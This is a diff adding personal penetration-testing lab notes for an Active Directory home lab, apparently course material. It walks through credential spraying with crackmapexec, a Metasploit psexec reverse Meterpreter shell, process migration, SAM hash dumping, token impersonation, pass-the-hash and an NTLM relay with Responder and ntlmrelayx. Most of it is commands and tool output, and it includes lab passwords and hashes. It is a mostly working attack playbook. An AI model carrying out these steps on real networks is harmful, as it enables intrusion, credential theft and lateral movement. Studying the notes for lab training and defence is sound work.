@@ -1,0 +1,216 @@
+Write down the IP of your Win 10 machine.
+
+Install crackmapexec:
+$ apt install crackmapexec
+
+Let's say we are on a connected AD Environment, and we managed to hack the AD Administrator User Creds, or even another AD User. We can run this command to see to which Computers we can connect with as the user credentials we stole
+
+root@HackingMachine:~# crackmapexec smb 192.168.100.0/24 -u Administrador -p 'Kawaninjazx6r' -d MARVEL
+CME          192.168.100.63:445 HYDRA           [*] Windows 10.0 Build 14393 (name:HYDRA) (domain:MARVEL)
+CME          192.168.100.63:445 HYDRA           [+] MARVEL\Administrador:Kawaninjazx6r (Pwn3d!)
+CME          192.168.100.61:445 THE-PUNISHER    [*] Windows 10.0 Build 18362 (name:THE-PUNISHER) (domain:MARVEL)
+CME          192.168.100.61:445 THE-PUNISHER    [+] MARVEL\Administrador:Kawaninjazx6r (Pwn3d!)
+
+
+Then execute msfconsole:
+
+$ msfconsole
+msf5 > use exploit/windows/smb/psexec 
+msf5 exploit(windows/smb/psexec) > set RHOSTS 192.168.100.61
+msf5 exploit(windows/smb/psexec) > set SMBDomain marvel
+msf5 exploit(windows/smb/psexec) > set SMBPass Kawaninjazx6r
+msf5 exploit(windows/smb/psexec) > set SMBUser fcastle
+msf5 exploit(windows/smb/psexec) > show targets
+msf5 exploit(windows/smb/psexec) > set target 2
+msf5 exploit(windows/smb/psexec) > run
+
+[*] Started reverse TCP handler on 192.168.100.67:4444 
+[*] 192.168.100.61:445 - Connecting to the server...
+[*] 192.168.100.61:445 - Authenticating to 192.168.100.61:445|marvel as user 'fcastle'...
+[*] 192.168.100.61:445 - Uploading payload... CHliKMTt.exe
+[*] 192.168.100.61:445 - Created \CHliKMTt.exe...
+[+] 192.168.100.61:445 - Service started successfully...
+[*] 192.168.100.61:445 - Deleting \CHliKMTt.exe...
+[*] Sending stage (180291 bytes) to 192.168.100.61
+[*] Meterpreter session 1 opened (192.168.100.67:4444 -> 192.168.100.61:49913) at 2020-01-25 19:02:54 -0600
+
+And now we have a reverse meterpreter shell, and curiously as "SYSTEM", not as "Frank Castle" :)
+We can background the active session if we want:
+
+meterpreter > background
+
+And then bring it back in:
+meterpreter > sessions
+meterpreter > sessions 1
+
+However, the reverse_tcp payload which is use automatically by the exploit to gain the reverse shell, is an x86 architecture meterpreter payload, as seen once we get access:
+
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+meterpreter > sysinfo
+Computer        : THE-PUNISHER
+OS              : Windows 10 (10.0 Build 18363).
+Architecture    : x64
+System Language : en_US
+Domain          : MARVEL
+Logged On Users : 6
+Meterpreter     : x86/windows
+
+And the System OS Architecture is x64, so it's not the best thing to hand them differ. So what we can do is simply lookup for a process that is running as x64 which is owned by the same Server username (NT_AUTHORITY\SYSTEM), and
+migrate to that instance of the process, to convert the Meterpreter shell to a x64 architecture.
+
+meterpreter > ps
+
+Process List
+============
+
+ PID   PPID  Name                         Arch  Session  User                          Path
+ ---   ----  ----                         ----  -------  ----                          ----
+ 0     0     [System Process]                                                          
+ 4     0     System                       x64   0                                      
+ 88    4     Registry                     x64   0                                      
+ 308   4     smss.exe                     x64   0                                      
+ 344   716   YourPhone.exe                x64   1        MARVEL\Administrador          C:\Program Files\WindowsApps\Microsoft.YourPhone_1.19122.138.0_x64__8wekyb3d8bbwe\YourPhone.exe
+ 396   384   csrss.exe                    x64   0                                      
+ 424   596   svchost.exe                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+.
+.
+.
+
+meterpreter > migrate 424
+[*] Migrating from 3780 to 424...
+[*] Migration completed successfully.
+meterpreter > 
+meterpreter > sysinfo
+Computer        : THE-PUNISHER
+OS              : Windows 10 (10.0 Build 18363).
+Architecture    : x64
+System Language : en_US
+Domain          : MARVEL
+Logged On Users : 6
+Meterpreter     : x64/windows
+
+AND BOOM!
+
+
+Now let's play around with the Meterpreter open session:
+
+Since now we have a x64 architecture meterpreter shell, we can dump the hashes from the SAM Database:
+meterpreter > hashdump
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Jose Peralta:1001:aad3b435b51404eeaad3b435b51404ee:d756e8535de56301fc63ff3153402886:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:c111cc18e9f7de8874bd8f0513820b55:::
+
+If we had the x32 meterpreter session still, we would receive an error on above command.
+
+
+Now we will use Token Impersonation:
+
+meterpreter > load incognito 
+Loading extension incognito...Success.
+
+meterpreter > list_tokens -u
+meterpreter > list_tokens -g
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+meterpreter > impersonate_token MARVEL\\Administrador
+[+] Delegation token available
+[+] Successfully impersonated user MARVEL\Administrador
+meterpreter > getuid
+Server username: MARVEL\administrador
+
+There are 2 types of Token, Delegation and Impersonation tokens. The formers belong to logged-in users on that machine. The latter, to services, scripts or programs running as an specific User context.
+
+meterpreter > shell
+Process 4404 created.
+Channel 1 created.
+Microsoft Windows [Version 10.0.18363.592]
+(c) 2019 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+marvel\administrador
+C^
+
+meterpreter > load kiwi
+meterpreter > creds_all -> It will give error as we need to be SYSTEM user, so we can just use rev2self, to become the previous user before token impersonation (revert to self)
+meterpreter > getuid
+Server username: MARVEL\administrador
+meterpreter > rev2self 
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+
+
+meterpreter > load kerberos
+... play around
+
+meterpreter > background
+msf5 exploit(windows/smb/psexec) > use post/multi/recon/local_exploit_suggester -> Use after the exploitation has taken place (Post attacks)
+msf5 post(multi/recon/local_exploit_suggester) > set SESSION 1
+SESSION => 1
+msf5 post(multi/recon/local_exploit_suggester) > run
+
+It will give us the possible exploits we can use on this machine.
+
+Now let's get back to the session 1
+meterpreter > sessions 1
+meterpreter > hashdump 
+
+We will crack the Administrator Password hash using Crackmap. Copy the entire hash, and then run crackmap:
+# crackmapexec smb 192.168.100.0/24 -u Administrador -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
+
+Above attack is one way to Pass The Hash. Below is another way:
+
+meterpreter> background
+msf5 exploit(windows/smb/psexec) > use exploit/windows/smb/psexec
+msf5 exploit(windows/smb/psexec) > unset SMBDomain
+msf5 exploit(windows/smb/psexec) > set SMBuser Administrador
+SMBuser => Administrador
+msf5 exploit(windows/smb/psexec) > set SMBPass aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
+SMBPass => aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
+msf5 exploit(windows/smb/psexec) > run
+
+----- NTLM Token Relay -----
+
+Current setup for this lab:
+
+4 VMs Running.
+1 - Windows 2016
+2 - Windows 10
+3 - Windows 10 (yes, there are 2 Win 10 machines, one for fcastle, the other one for pparker)
+4 - Kali (This machine).
+
+With this attack, instead of taking the LLMNR/NBTNS Hash and crack it offline, we will use to relay it to another machine.
+
+On Win 2016:
+
+Press Windows key > gpmc.msc > Group policy > Domains > marvel.local > right click Default policy domain > Edit > Computer configuration > Policies > Windows settings > Security settings > Local Policies > Security options > And disable the following 2 policies:
+- Microsoft network client: Digitally sign communications (always) 
+- Microsoft network client: Digitally sign communications (if server agrees)
+
+Then we create a Peter Parker (pparker) user on Active Directory on Win 2016 machine.
+
+On Win 2010:
+
+We set its DNS to point to IP of Win 2016 machine (Domain controller), and then connect it to the marvel.local domain, and sign in using pparker user. We can also login as the domain admin (marvel\administrador)
+
+Once done it, we will add fcastle to the local group admins (Right click Windows logo > computer management > local users and groups > groups > double click Administrators group > add fcastle to it > save it.
+
+Then we go to C:\ and create again a folder called: Scans > properties > share > fcastle > share > apply > accept. 
+
+
+On Kali:
+
+We will be using Responder.py again. Go to /usr/share/responder and edit conf file Responder.conf > set to Off the SMB and HTTP services (we don't want them to start). Then run Responder.py
+$ python Responder.py -I eth0 -rdw
+
+We will be listening for a hash on the network. When such hash comes up, we will be using another tool used 'ntlmrelayx' - Use '$locate ntlmrelayx' to find it. We won't need to crack it.
+Before running the ntlmrelayx command, go to the directory where this script is located and create a "target.txt" file with the IP of Peter parker machine inside. Then run it:
+
+# python ntlmrelayx.py -tf target.txt -smb2support
+
+It will just sit there waiting for a connection. We will trigger it as we did last time. Go to the Frank castle Win 10 PC (Not the peter parker Win 10), login as Frank (fcastle) open My PC > on the URL Bar just enter the Kali IP to try to connect to it: \\[kali ip] -> it will send hash to kali, which will relay those credential hashes to peter parker machine to get access (Pass the Hash), so we don't even need to crack it.
+
+
